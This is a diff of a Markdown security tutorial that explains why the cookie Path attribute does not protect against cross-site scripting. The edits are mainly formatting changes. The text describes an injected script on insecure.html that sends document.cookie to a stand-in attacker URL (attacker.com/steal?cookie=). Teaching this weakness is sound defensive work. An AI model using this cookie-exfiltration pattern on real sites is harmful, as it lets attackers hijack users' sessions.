@@ -136,12 +136,12 @@
  
  ### How the Path attribute for Cookies is not suitable for security
 
- * Example for limited protection against cross-site-scripting attacks.
+ **Example for limited protection against cross-site-scripting attacks.**
 
    Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon 
 user login.
 
-   **Set-Cookie: sessionId=123; Path=/user*
+  ***Set-Cookie: sessionId=123; Path=/user***
    
    In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the 
    "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.
@@ -150,11 +150,11 @@ user login.
 
 <kbd><img src="screenshots/insecure_html.PNG" width="700" ></kbd>
 
- * Example futher explained.
-
+ **Example futher explained**
+ 
 - The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
 - Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
-- The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker **(https://attacker.com/steal?cookie= + document.cookie)* .
+- The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker *(https://attacker.com/steal?cookie= + document.cookie)* .
 - When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.
 
   
